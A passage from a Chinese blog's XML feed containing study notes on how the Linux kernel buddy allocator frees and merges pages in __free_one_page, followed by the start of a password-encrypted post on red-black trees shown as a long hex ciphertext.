page，</span><br><span class="hljs-comment"> * 与其合并后升到高一级的order。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page_is_guard(buddy))<br>clear_page_guard(zone, buddy, order, migratetype);<br><span class="hljs-keyword">else</span><br>del_page_from_free_list(buddy, zone, order);<br>combined_pfn = buddy_pfn &amp; pfn;<br>page = page + (combined_pfn - pfn);<br>pfn = combined_pfn;<br>order++;<br>&#125;<br><span class="hljs-keyword">if</span> (order &lt; MAX_ORDER - <span class="hljs-number">1</span>) &#123;<br><span class="hljs-comment">/* 若我们到了这，这意味着 order &gt;= pageblock_order.</span><br><span class="hljs-comment"> * 我们想要预防在常规 pageblock 与独立的pageblock 之间的合并。</span><br><span class="hljs-comment"> * 没有这个，pageblock隔离可能造成错误的空闲页或CMA计数. </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们不想为了更频繁的低阶合并使用这个代码</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;<br><span class="hljs-type">int</span> buddy_mt;<br><br>buddy_pfn = __find_buddy_pfn(pfn, order);<br>buddy = page + (buddy_pfn - pfn);<br>buddy_mt = get_pageblock_migratetype(buddy);<br><br><span class="hljs-keyword">if</span> (migratetype != buddy_mt<br>&amp;&amp; (is_migrate_isolate(migratetype) ||<br>is_migrate_isolate(buddy_mt)))<br><span class="hljs-keyword">goto</span> done_merging;<br>&#125;<br>max_order = order + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">goto</span> continue_merging;<br>&#125;<br><br>done_merging:<br>set_buddy_order(page, order); <span class="hljs-comment">// 在 page-&gt;private 中储存其 order</span><br><br>    <span class="hljs-comment">// 判断是插到链表头还是链表尾，通常是链表头，即遵循 LIFO</span><br><span class="hljs-keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)<br>to_tail = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_shuffle_order(order))<br>to_tail = shuffle_pick_tail();<br><span class="hljs-keyword">else</span><br>        <span class="hljs-comment">// 该函数会检查是否下一个最高阶的 buddy 是否空闲</span><br>        <span class="hljs-comment">// 若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部</span><br>        <span class="hljs-comment">// 这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</span><br>to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);<br><br>    <span class="hljs-comment">// 插入特定迁移链表</span><br><span class="hljs-keyword">if</span> (to_tail)<br>add_to_free_list_tail(page, zone, order, migratetype);<br><span class="hljs-keyword">else</span><br>add_to_free_list(page, zone, order, migratetype);<br><br><span class="hljs-comment">/* Notify page reporting subsystem of freed page */</span><br><span class="hljs-keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))<br>page_reporting_notify_free(order);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们将与待释放页面凑成一对的内存块称为 buddy，所谓凑成一对便是<strong>这两个内存块在物理上连续，且能凑成一个更高一阶的大内存块</strong>，由此称之为一对 buddies</p><p>该函数主要流程如下：</p><ul><li>（continue_merging，循环开头）调用 <code>__find_buddy_pfn()</code> 计算待释放页面的 buddy 的第一张物理页的页框号，算法比较暴力：<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>调用 <code>page_is_buddy()</code> 检查 buddy 与 待释放页面是否是一对 buddies，若否，则跳到（done_merging），这里的检查需要满足四个要素：<ul><li>buddy 不在空洞中</li><li>buddy 在 buddy system 中（即 buddy 也是空闲内存块）</li><li>待释放页面与其 buddy 在同一个 zone 中</li><li>待释放页面与其 buddy 有着同样的阶（order）</li></ul></li><li>若 buddy 为 guard page，则调用 <code>clear_page_guard()</code> 清楚这个属性让其变成空闲页面，这里清除的操作是通过将 page 结构体的 private 字段置 0 实现的；若否，则说明是常规的空闲页面，调用 <code>del_page_from_free_list()</code> 将其脱链</li><li>此时我们的新的高阶内存块就完成合成了，接下来我们回到循环开头重新寻找这个合成的新内存块的 buddy，这个循环一直持续到 <code>max_order</code> （一般是10），作为下一次循环的页框号的计算方式是 <code>buddy_pfn &amp; pfn</code>，之后做指针运算 <code>page + (combined_pfn - pfn)</code> 找到对应的 page 结构体</li><li>若退出循环时的 order 满足 <code>order &lt; MAX_ORDER - 1</code> ，则调用 <code>has_isolate_pageblock()</code> 检查 zone 中是否有 isolate block，若是则进行相关操作（<del>这块代码还没看懂</del>），最后跳转回（continue_merging）；这一步主要是防止 isolate pageblock 与常规的 pageblock 发生合并</li><li>（done_merging）这一步主要是调用 <code>set_buddy_order()</code> 在 page 结构体的 private 字段存放该内存块的 order</li><li>若是设置了 <code>FPI_TO_TAIL</code> flag，则将 <code>to_tail</code> 置为 true；否则，若内存块的 <code>order &gt;= SHUFFLE_ORDER</code>（<code>MAX_ORDER - 1</code>），则将 <code>to_tail</code> 置为随机结果（<code>shuffle_pick_tail()</code>）；否则置为调用 <code>buddy_merge_likely()</code> 的结果，该函数会检查是否下一个最高阶的 buddy 是否空闲，若是，则可能正在释放的页面块将很快被合并，此时我们应当将其添加到链表的尾部，这样就不大可能又被别的进程很快就分配走了，而是可能被合并为高阶页面</li><li>若 <code>to_tail</code> 为真，则调用 <code>add_to_free_list_tail()</code> 将该空闲页添加到链表末尾，否则调用 <code>add_to_free_list()</code> 添加到链表开头</li></ul><h2 id="二、上层封装函数"><a href="#二、上层封装函数" class="headerlink" title="二、上层封装函数"></a>二、<em>上层封装函数</em></h2><p>所有页面释放的函数其实都是对 <code>__free_one_page()</code> 的封装，最终都会调用到这个函数，路径如下：</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>【ALGORITHM.0x04】从二叉搜索树到红黑树</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-08-28T20:46:56.787Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码出错啦！" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="34f01c8b30823cf2c49dd6b881dac2b5e318081ca58d030d376f6e97dbe5cc74">afdbd80b698a50e90523fd700308ec65f44e06d46f63079433cfca60657b16ff93bb2b1a04d8edd7ab5ff0d1b5476a6fd26393991a7feb303675f276bef9bd6d95051256b4233fa4340b26aa06280f64514ab8c3b30fa20ac5118fcb917d57ad3b481c5c43dd420e88cf175e2bce126ca7455645d534362aa994abb13840873a37663e8b81b982c07841c33324b08b12b6f9e408b86735ee54ba9778c62bb56800f1576484673f5a74e0c404176bcc45bce18c91cc268793a759e3f42a7371803e83d9bec68e1787cfcae81d0d40155bec8ea944f76fc70766fef9eba27a88423ec1cb22596090ad16dce1f9b273d9fca901029e3caef77f644fa69102f8fc40624811236eb96ced5b894d6d12c72e4e8f481c40641c4c361ed34c3e01611e6afac1028efd46b20846f89bc09388f39b44901b1718ecaa3e341a378e7c9536c90d8a4c2335596607bac029ea5df4f08068752d7fdebefb83c9f1f6e5857066fa344bc26c954482057917acd1738a56add0abc05609608b67402fe13f2937d7bff6c3421d07bb97962ffe6f2a928e99ed168cf98e304fda7001238747a9937921a4854cde5f196a128ccf656f526f52391a3ade33179216029e7f9cb2196609919d42a360d3e19360e5c87e5ac562cc5c4b80a8a0628e4b12588ef34028bc9b068960e9d10b55885977b219e65272c3399ef7bde3c97d8fb131d2a96bdc82e472f415aa7aeb8ac859b48a44b3c6d4d37c6c6c191eba3f6eb311b3c4e2e4a47539a29c87c1e83ded2f89758fddb540937155396443310d8fd39cf224a1a2df3c2cc90243052b9fbe77b7139a184c719d720c675ef36fd754c08aab35e2e988f4221874f9c9ce9e1f2fefc223a458a62b9b2c43621fa0ac4fb70b63ea5405a23b8888ab9a8fc61af9f8bf65be4ad4c74b69bce172073bfe6060a5599961be6037c5e68c31f4d9d9d45bc39995873f4ab69bfe27da6563ddc45a9a397dbb2e4393ea1faf9ee90b6f0d46ac304560e1560fd0c9b9cc38afe3674fd486fb07e1833e5bd562d5e729efda52aa95453ab8298a8ad04375898ab3311ee7086db7013af5405051dbf080c5e04190d6dbe8e8dbacbe88868e722592ec3d86183f3f0242351ce660a3469830fbd6177095202f3353840186d8270028efc7f450d191a69ad1fe713e8c7d129250d950bbdc8fa309550946c460741b22ea44dbd702cd5b1fa1ee26861cf2c09c107cbe6ba760e2744eb51561ac898343eccd715573c41618cdecb839108688e2e399a8373413ab587a4813dd1ff92b1cc969c36531a9b745cfb659b2312143f5eb76e538e726da551ffb4b1b3122b4bbd327103dc4d19e8fc4afc1035c58489711a9290ccd11d18660fe09a0589e025c5204e8b407e3799e6be400b3c78a110684807630ce112927ec8a5997ac621757134c34de14eb60f5e8a6588e6cdbf1b11a69154716742b2801ca9573de6d10094cc9340f19580f0fe2f1f6cecd9dbd2cb64e613d9cad1ccb995c1300a0eb1874602588ae627c0dbff16ad30e8e36655bed515f2b6f1f7e72a941fc5dcd284e9ee4654700e02afb92bb15005ba79d6a6e24eefa5a23009cc12d1ec42488452a39b73fd9594439c1f9fa3fadd3c9eb7f4ec8a937fa3c1d4ae49f1dcbc0cb8b7ef24bafa1f847879b20ba5c6ea8c1d9485017d20638d8e9a46e4dc8793e2c7dca2ffd845120dffef2a90aa3447d9750f0d38d145a7c658276c45cd0757397d32a7cdb101a37eac891452a7bc1437ddf56d2dde76a87477ec198672b3c27de67fd8873e16c0bf5f00822302cd4a0fb6e861c2ecfe6102ea6bedda14cf5be61d4453e0a3057a2471ae8047b38bb23a54e2b61640d3ea58c80f7c5c9626a108914d64b91c8588fcce80d284717b55d00059e2e65877beed47732b80fab0c3cb5b9f09c0cfd8b99f421bd25b1baef1804175f6a29b174ced750995f5f5aefc494f815922f5e537b712aa488da6929ae88291aa2f157d2110183191ab8e97370cdf5885e7e116c950c5e51950cb1925e51bb29ad0ba927556985031120d35d64ee3c8214f11ba602497f934d9e32e6c978cb5924d878520c2f9b155ec1892e1c14ff9d2164984a0ef27911e6dd47d7ee7a7c5d47e7b84b7c09006a42b1c71c673af82cb6dd776a4982e0a52d3f22c51010ede6c43c1e01a5a5df2acb806666b3d02f9512b24e9f6ed34c1f0a7554e1084e609af6eccf87592e7f4c13ead67ca704f073ed333c6a439e98d8e6b5940de6145c21dc21634524c30050edbcae335fca691c3762646a0ee351c95fe709fa8407f6f616c549410b8c7aaac737457161275dba74e2de298df42e1983dc7e4192203eebf4f7572e13157cb43cefc3f81b6ebce1f053f1f04bb44d9c63052695efb24e8081b8f59ed155818be8c8e421631ef032f911fcabc34d73c0c7371e038a5876e5d8a341d2a6160c22249cdbfb682cb7e1514be3e83b707f3829a3680c516935e56db1085e6667440cad76e73c47820d9c31707ca47fafc9ad67b12a206386c848306eb31b7a4278d7d57149c9a00ee5e6ba383192c39ec01a4d1ea162eca1d1fcd91ad92c2dc701aea8a23c62b933149bce6196d87a485d52bd4389276e414f9462cacb529d85c65c0394c85f3627b6c19bdfa06abd220e1dd9184dd8b0af7b15e79bb9d8361b84c3cf28e6742d24463e746280c6d5273c7513a822cd45122aeb4dc595efe5412548f483a9c1184ce7b66f20715883c354c1893a022e511ad435b9fdf67040d1a8d4cac7f692fc2eefdf8fdb40608a515031d56e54cb63c643bdfc05cc7b62d02bbb11d3b93f3706a141e242a0cd29449ecca7604d38d86cf7d62a39153e166515e3933e6c08c998cfc703a3b57bf5101fa01cfd4cd7c48b26a5bd0a26ff1504390852719de6cce318b09e6b19252fe3508163822946328db422646ecfa28ebbe19800ca985bc437cc3aa88e9c174b3b9b07c151df298fc831e154987847dc8811c0a9840b1e7657689c3f39abcb3802d63018f5796dcec9a102bb03f56601aad9e8e5d4229490863d517ca7898a39a3e48ae60649d2ed97c126e408fa38f61ff4af5d21eb1463bb4bf003f2906b38e39dba02ecfad467eb360d18dcb9ca4abd91f27b247f487aa0f3effebe9e3dbb6f857322b5ed98d4434e9feefa85377ebe04f0d7848ff53ca61a3a755ca60e078d382ea65cccd2b8d680985733e7564f28d4a8d07c22eefa72cfa14ac75cd89d59d9e7092a7c0eb8fc930220a6474bc69e214dfca7074fec3f0b10bfcda623535ce173e068166d6c736c0c69119044c9c5e649f11cb5f9c4414117f9b8f709ee7ce7ef510301b77398bef943ec98c09648ad1c5ebe53763ad3b7f54e7e5ad8a452f054271c15b56c1e81d8ab5b250d275da2cf977b6a20e8bab8c8079ef9a462935583958b42220910d21b8f9410a949cab367087b9bfd14beb76c54d8ba9b0223e0e3b0b3b9611f0f8fb83183c1966af78b6a86a78c495e8b03c952904765b664579515c6213d873793ca27bf940cb3d945106a9ae4f75e354ee07be3225c9fd9b5b339334be10a06783e5f35cd9b179d85c9b9cbfb55482d7c3601cc59096aeb042feef68eddaa1f31bace90b1459249e79484b4dd10c683ce3b5efcc582d0af3365c0029364c5768becee185db102afa8921a1ffd6c90023614527c4d4368f3c9d6574031e857d0c5301f0712a363d57b84d302021840174ea9ac95cca5c3be65839a67a1ef661790c7f1cb635978b06e030aabd4f7df82e6b68717c056d4640923e1579a2931876fa7904f7c3076ff945990dd131cd1accecb9e773eebbfc970d0cb8932aad7dec1df6c0279a58dd3b3c2370667803845bf543fded5877108d1797224980a216c443a77fa4ac10c37ca0a59b54adf75395aa50fee1aec3982dac06db545f796b82bd12ee891250fd1f91587c93223543cb9bf47a3b872644c59f848324bf14cb747e780e725ac9ecebab8bb7bbd4eaee40fb009892ab4e44db917b3c8499f8e378957dc90802ac97ee3cd0caea98461fbe86c41d13853fd39171b9cc8696dd7e0577fa5dc37ae88ee55c4dd18d3c03e36ab22c79ef86bf72820077dbd907587e4efebb0c02ccfc12943de9c7e07c4bbc664103fc701198537507e4165721c4abe6fdbeb793d4ae9a6ba5cdca5c377524133eb689374dfe01e1c27436b40de7797d24d9776fcbe8a4a0867356db8c37740afeb2a4b437e8dab6f5c9f149c7968474d1654c562728b8401ad33d1c404cf8f306d822718ddfb853cd72eb5360ba640b3526af856f568e6d666a92772ef7041f35b7d7b60ee088e9a5f79d5de90de1b1b9f856b3517bf1c8fa1e748d935509640cdaccfcbfb74015eaf047062db6855b11d90a4ca067209c5d7cb4f837dc6aac9b73869f6b17dac5acff5ff26c5b87af17e58f31e766a47b0cdadbf390aaddaf9b289f285e86823e30fdf17577f4d2c0b2328e8d0f6325a55585e5309e3645e5af0709addcb7d847863d3708894b607fe2082cedb94f23790f04bf58c85194253470a0d2e0f4c92987dff056a294838562d5559fdc97baaa357f49326018ee5cca9f7a302bcd14aede1620a02ecb1102375fef037d60432c4605f0db2e7337ce1fea3000b3e31f122d672316c9f3ab054bb2ada3cba14b225cfef1c87fbbcea2deeeaa472a91d3c7fdec9f2923394586c5e8def4664d8ef80721f16b7164563cc5eba0fb68c26e5ba70755b2f4d743eb431e5e2a9a57232b87a5d010bcc551bc79a5c595a53ab67db647755b9279fe6213e5240c992f8fbfce77a61c5afb51fda0becc7013edb881d43a0bb566410d8a4441657a77a95e840fe0a218b8c655d93b9994e425364e1b9319d984400df0f6fd375e19a38c7d2d017ce5e4fc538300b44c30cf1867ca67fb1ba5205c9dc7ccc3e5cd767c19df30dbcfff0290a444a0fb02d14ebb26b4bc78f58fa9328ceb869d6a73309e4719b37f972492d5a9ce925e9066fa672f3b321e819ab47ba4478250a61178ede2c0e660c8c71e19fde4ddb0bf5d1301e954e1c20f7528968517bc93d9dba397b05147813cd1423036f28e98adfe17b8f1f0791c80158773af82892f47c9bca38d8e5ba26ee4d1cbdb5b8f029b9021fac67d449fb5a2e6f4e4a19ad0683c27a1ea6dd1aebe8569b0abdbec73de4d872637d9a6df80b987ebe2b850e06260a8ef16066595e741f4202a56e6ab0cc2c6bc8caa689cac578228bd46fd52aec586a354d38e10827067200fbae34f2f73d9d355ba2f0eb77b2af7d07da7b2a6bd6855b97f822e791043dce611b61bf06506b625e30e9e2d681b4b1f71dabec54eef6c1bdd55255dd4b46ac78e3a06c28de32ded55053bfffe4e317525d94d8dc602c11fac11d067457a7ce5e1ab7a54c17447fa4bb7547fb0be08a4e08b93519b7e0935ebbf40b3e7646f1d132237d2ffcb55db2d9a0a41689a5c478e40cb6dddb53107d28128969cbab9679121226057888e92a547d69fc3e63ed74f685f3668fc33d6492b7b0da23126e854fffbb052e6e85ce8b66799bca2fc3c19427f145e6da2880d869fa9eba47f8a6c0e1c2b2bc458763f6ef6897dbd0a434f75d7bf918209c437932b1bf1dd10da112d9d22a4fee80c3851337e3b8aa79563f0a0f002e8d2b10be6021d993f7bbc6b308c5e7f957455f9bbc804b5bab1ba5d2f4cfa21ee98062e3bbd5d8d0ca80bbff63a224c546f236bf6e207168522efe838bffea347e44420ddb7949c1264fd8ec356f7f0e0cb4468cbe61b53a2c805000d31a7e073e26da3c07f714de29f90bde199d4c1c75c8e487ec31033abe3ea89034be925c73912ec3b58bd661978334ca95fa13b2ceedae753dc7efac8d4a169a0c40aa0a6592bd99d4e01056c860c2bbd9bfdd2c8c675b7e172ad2974eac30b4f4cac45a18e1e7d1f1f58744554726e35be3d2071567d48ddf70d7d7a16c8f390b0d45d96585309c223cb717d73e61e74c51e5f0b6f6d4193cc534d1ba4709e672f686a07675cfb02d532c2b90ce8da9f033b9aa09a7da587c3ade262251f4d740b0f56df96d080e045cb6d99eac499517174c846328e0179e7496c700e078cf578047902341d56e55e83e1e8390a1008fe10ff3abdfaf8cbf31f9c00bf9e792c5dfd8e3a24d9a8b5e9447c72b944284d6d1120673882d8b3f39e79666d6c3d2ec87c2d80da550ae6fa745859dfcd9698dc5ba1ab581caaf02daf16e4008126e94e81ced4c812597451788a7b482205d9deb02157f30a1efac8c0b0cb964fc77b0533e9283a23e7ba2ed72e3cb918032314e97930df265322ca95f789c67bf1c592a0b470cea3015ec7c21e5bc6401d184200362107cb4d8dac230ade4df2dfe0b471ab213225fa9f0a12936610bc846408da087154e3d4d2b60bfb0f62034c95a5a2fc98fb8b0dc4d4074a24280648b53f033d86663275bb552f0cb32334047c957a17d392c6a0f1d519982c99911bbdef06d4a22f5bf2119c8f1fe51c2290a2567e3c81a150c633fe7c5a093e8324c9376770c8a55ec5975dbdf046c5420c229e480b18c01b1ac5ea5aa82e60f7f33115331567a8daf2fca22bcb10b6d70000a17aeb2d0accbea423a45ce7a0a3ab6a54d90a4afb3e0531635fa48173cea6db89c03d86b280d932bbbaf207992849fb1bd0671637e93180d41d642af4a6f63c14b7be6d9ee7b1629ba6bc607b7ab568a6c5df3741f207b276db08587a5ae1f392313c559fcb047771c5a5adc57077f80918cde2565fc14f1877902ac693757ec6daf9d5671148ff6d2d7051637fef4baf00b539cfc61820a39a485c4077980a188f87572305f49bfdf41ba4cca7e39027230bdaf3906ce9ab70a65e3d0fcf5b84cbb54cc2a954b32d592f1e2ab1b544b8952b2fdba1e72aea42c2127d4aad4d5577af94e56e6179c7dea6c5071ca35a472f77ec8531ff1b01d949ac291b4c5963eb6e043f2b93241e7d5b0727e9d5e25d0749f578bd1095996a6d4b9d3f897fa29a41c7eeff56575c651846633753cb0e7f3ee915c536e04104bcb604c62bca9e31c16edc4ec9304e31e7b3d992371bd33b8c4b79a8aa1bfb11fe26713e1eb219f7167424a00c190177a9ddc8f911d123a365521d504af33bdaf770960b83bf86e4fc266f9e904b92aa26e4ac7c99134b56a2438a8da924a4137774007ad6480963b44798768b727117ec90237c1237d3af2f894fd61af4e282aaa23c893838259c1b63b7a119cff294d6d63dcc33b78d72590f237bde39fcf8f8f41eb884cd7d254e8d9653050e62a675292b1314c8b94acbca9f29886991cec81fc79a7c41e3a1dd146d99d9297f9978c205664107445ba0d18f119094526d714523b9e35f984855f1fb29b725e8903bba06fb7b86d72237e0641de3b79ab3dfbfc1b8e44405c0eec56201ddb8b5530640f31e2b1a6ae6436810b5960f5b7590787bc9bc5d8811fc6056fc5b8e056cac2fd56566425144fe15e6aca0af86212556c1e5a6a94ec6a83c686327ff28e5df7682122c0afd4b3e01d31eefcfc14ebb8c875456dd4126260530c6dbe6e2e4a1f989ef76519f096abd3307cd2c3f2af043d9051bf96c7ad8a0efac3370c3f6067ecb2ae18c13a2b045a86b9611d6078ce1503105e5d194b4e0c23aa2939d4e3d08a2ee9bf6cd8a73d90439d48c2aa3fef3d374c0a4d2f67109335665adbb339ba36423605660c65c1322bbc6db06160ee1b6dc970453678218d0ea2eb388dc1131836b92053c30ddb362108af865d4a26d6005f78973c74de8fd0a536c7532326bf9c62fca5fbf90056922041f7e9ce8d227c8c5bd26b0bf02b4c5be88304eec243686fa2643dcb6a9958f9b77c25f59e7936bde4a51edf1ecccd942f4032180a665dcd7240ffc791092a1a5e30c8198c2eee5130744850dbe0775c965a2e49779c4a1f2f3e9a0b1396f75300fe6e75da18c6b21d2b948241d72ab00e7f7c392e2b0185630f23320d2e82e44ffae81dcd57915e839d3d0713efe4e42235096385d18ff69558e3cfa47cd2c6f5034831b7ccd83b591e287e4b07991174582a34038c47c3567c519b7052b1dafff0ad6efb63a0996bde9fefe73225657f6086bdd78c1ea085e8c2b5b0a41c3e512958028fee4ff6be93830b19cb9e4aa488a6b3597484cd8d898e4ddead72dc2dbaa490aa506a6870f6031215cecdbf22a59aa077eb20b0f1b1647da7eedecd608c9eb9422405f6e4d50fade5238c641a7281885947ee0c5dc28974a620a9bbb72f1c5aa47181ef74d2d2702beea47830cebedb3f6a0b19b0fc38e8533f6a88ad02515b64f4e5be33c8aaae9e3b026ea0226af96c38da98446249f27db0afa5efe0574b248b98c5f33eeeaa1edd6fe25427af473794d6144431f99d41f0c1a511ed64367355aec1e1ad931aa48784f2cd06aae18073608ae761d4a08231440027156d2e1d86170b2be9617286f925c86f4f396160621d2206cd71fb63fb2143c550910336a32ee84d6e7b8447848a2368eec48a71a1d6e592fe9b0f82631aa1307e60622d7ae201eecd850ce8e25848df1d685ee116580f79f366a04a0f55acb768c073ba1eeaa286d7e6f10b9abe1f928673f0dcc82cddf18a5b9992d7750c91ffff05c1ee708e004d88d89fa4b035389f9bef04ff5aff8a593db59bde89c6905cd576077660c58e9fbe1b78bcb97958e5a07a1261ff6490c39c3370d4ae34ad374f79bfc972b824379df86b4086c1d2e23b1e7fa02a06ca81f8659bc1d934ed91fde10989ab30f69d9381398bf4b86abd3171522cdba06cb7f0fe5bb00ccf05fb1475ced6ad3a3f0d18388bad58b6884dd30d7ef2ea536fccdecc155b7363ce16d89ec9e534f9f6ecd04a6b29a60b9024971a6d31ea038e1c307c831f2c30c78c06615ce5315c06d3651c1f723f150c884708dde67185bdc4a663aa4300050953757b1f1f615e5bd7f503cf4218ff55225701c220d9edfeb040090bd0668fbe098ca2a816e195443e15601886bfcaf75576779744934df1d586b9c69d9ae9d9ea040eea27c69bc5e397f68051f9ca4200213ab4796f1eee4b7d0a5faf50134ac81a43ee4a961c95c2e6c167b1e6f9a0f44c34ca94a1fe005e1039fc138bae0687bb506d2bfe7b50c17459841269eb3f0194c3ef6b2c6109281e115da5cc4f0660924163c39553b0990644214e67d526c575a5d4053957ac414ac786426c444d4ddfeec1cc3ed3b742ff90fc6b9ad35765275bee354d69d7069ecbce314faea6738dc01a4623670b2572bc2bf11ac4c884d0a41aa8c6fd1b505677a689a7e4580f44956d1cabf775e52f1a2cc39b7cd878f99f686bddb2d00fd524db49fa62d8ee16aff31b67133f25bc9034311b57cdf856b2fb8d48ba21836e56514c80ed2b4d967a37cddb5661c228d1b2584875f455e11ced25b2d860d00f3c937a7b97641af37af9694f90a11c2b24e46061d56bce848d9657b2a95a9de0c04937f1b0aa7045b18347b4f6fa04cfd7bf293b84986635e1b0c465468f1112b4fd6af6bde0dc597f2c65a7190b0ef36df5ed75ea745643f6bdfde5c4da7c43d552cbbf3d478803fb32467e2df30c931b472c88702af7526b76cb26cd0ca48cea5a2e4b5c225b0a3afdb096cfb739979506a6d17d651390030ea24c5128f24aed6a1bd068d3011730ae8c4c1f4c7133bd676d1102e91cb8e6d95054ead3742f2e93005b0984faf6acceba2803d32493698915bd037f0098a70b4f286fbf9d961d634deb2cde4b8b045d483fa0274726907111d12e6c9eb07574c733105f22cfe47a29fa1d594f83396b41c0f99c98a7dada4dac4710bc99c0d5f0a17b03997ded26993dfc815e5457cd39435fc0b7d82d43aa68dbbe15470ce904a1d9d6dbe5e26dc38e27ae17502fe79aa28333d21adfad81db543c49a0972a26b3f82fee4dc48746f02c41b7f20f68a5df07052f5b09dffa56d1be820e2aace15450ea21fa30156050719cace1e3993300b842403e1f382e931b0399a8a1fed56ab18205e55818380b66985c905f0971f4d6830ff183338ef2ef923c65201cb54f10c0170a6d968e7ac1877659306b89ac07322ffd7f8259a65540f7979337574b28df1dd93e208d3f950470c5016f5fe2b9d194fa18150f545739520da2ebf5cb12106968ef5a87dc8223054ea5738c62869e8777d4cf2160dd868136e3951497a758d7faa31ca6a8f3fa34ae386c583b3f8f412000de2501979b5b0e2fdf848ccc4f5066ace0e3deea0a27c3f6d2f6ce778800c0499a7dafbcd5dce6ac100758ee33af798f51e82f8a8c03ccd57a2f3d86664df80f96fc8c46df143043fa9495e4b1822e8e41358d5eea3e7d5ea316867c16443045a832558e8d38a215cbc42a785a570d4754610a7e7545b4eab717a2844b2f3cf8c48ebf7d68bc53c70b2e9a085f03956950191c9ad85e911980d039d47da25e1fe5ce093c0b1372e3d0e39a8ed51df9362c1941a34870491631ccb09f04d1ee528eca83129cc3230a8145846b474e9eb36fc077f30573f3a61e232e45199b953b9a43e39fdc82533725e390a0121fd4eda13ef8bfba38231b0ef33eb7ecf6bd055b47df28b5106617d4f9a268c2f328dcf92d2949e5a68124dda34ad0a75660ef937ee8108835ca91cdb7b98bfaf44aec340a09be8f80c5c73f131f56858c4aedccec1f6f34087f18fba607cc6e477fbd44bb13d227fb351f7e3acc37b034905a5a61ad4c95b1d1e746b4829de5394a1bf5f997b9cfa65d77ab55aeff62a62e675204ba5d70c672e41e9e999c674f3e76f8d0320f5264c9132d92d8b98fdb54f90118de945cf64233bf10b01a5d285b76f89a39d14264a612203172900d9b21369ac3b88315a8e366f62ec01e111cca85707ace382864f593f50a1a566198140ac3d3a3627a3c9e2e4a8f3f3038684f6bba4a0b2e72d7683054cd1f6a9e23ca9938de11d6641d7cee4ce83da004659b739f10baecf3c9bd8e882771c0c80b20f4cbca3e76d89b088544b647d526203d74990037cdbee58402d56d9097a53dfcbf86ad71ce20922b589268817a2ab64e1e688b00e059d73c45d97915e8853a5c50c09685cdd9e8d837996f1d9e412115bb03b62b1088b3ae29ca2a334b1923be7d0fe0f0e643133b3ac865d4ac44848b881c90c04f3394de61510be1e8704145997f5219044c6d579eeb2629135c66b3da49ff7d4a9489a4fbe962293a147a894936386b9428c6307d06780112a7ea3312516385f393cb511db82938ab0000c1028ec0a854049ee86a68e6fc87dd12f042730d85ff14964bed963be973e8e3d8df8b47c3711f9acec97b8d24e0bdbfd7729a62f7f9a4640e07c0c1e8d001956e081e8a155d322e32758d4526ae789453a16b06936b5eeddd2621ad166eb0d3f96aa348f86c18240e5fe8f553a0aff894b1c8abf8dd702f05a33088cd760a6ea52a7c88aa60587d430b2703cc76c5ea0c75662dc9ee655982f1dd70edde69b340d5b4a85a4adb28e4c4c3dfd32151bcb3b1d3ad001b5485ea0a048ab63a0a49371b157dcfaed86e6796cf958727dd85dfcc3783d1fba10e302e1c105d85c0b82d5a232a8b00880f426c4c17e0d8fda355a95fa1c217123c1cf40a1a11e7400b989d0b61397976e465eb07a1c7820cc076d8730779c3d2d3fc5f697b6ff3ed56951e1eaad05cf63d6138745c77c1c87f2825e3b04e6a22bfd7e58d32e48f8e10510564d7b7f670dc2ff2836ad3cf4b526f9ce0eb1cb956d1ab4fed6ffa17c7fba3619e19f7a107dca7e9140194339c5d7c986598569e21d0d8d0414365c834982831ff43846d151dc1ea951d0cd7581bb0882f4d108798f923a6d1de6a47eb5eaf0d433b52ec2d2f727ad7ef85675383c06d2394a21a99c672ed8498e8c16bb2250e492287422ce1a4809dae1e507c2f85e48f90b2d9f8927b8af1f74e9152214e64f5c1070c2b0f60a04a0070abca8a1a1f383ee749acff6d87e8cfa3cd7acf02c6002cc8fe5c10c7d61ab42ce040bbf9a954d820db029c4cdcb8d08b06faf29c04fcca8632a6ab90f25c6a32b7be15157d467ac4953f640518e9a520f118b308cc95ca97e5e37698933b3f279c88a74905cd7571cd967eddb5262a9cf8d6013653d25c1210caf75f34e4488e834042795f8d04b93b8a7ff7fa88ca318d60878c5cfb9cb43e4d8c0e27c447ec48620f8b7a686175272c6d61e2b079ef4066d6ad382a899a0fae1b570164d0d1f0de48c405012a438c53d0b6eea3e88df762d5ab87deb82f0f770a20ce5485f8cdd6cc3e25ba737c149b589cc75c3c2ff170ab7334ea9319f67ff2b1b565d4f4d11ebcfb26337aea3f5ad2a1faa3d498fb568af07eddd6047a1cf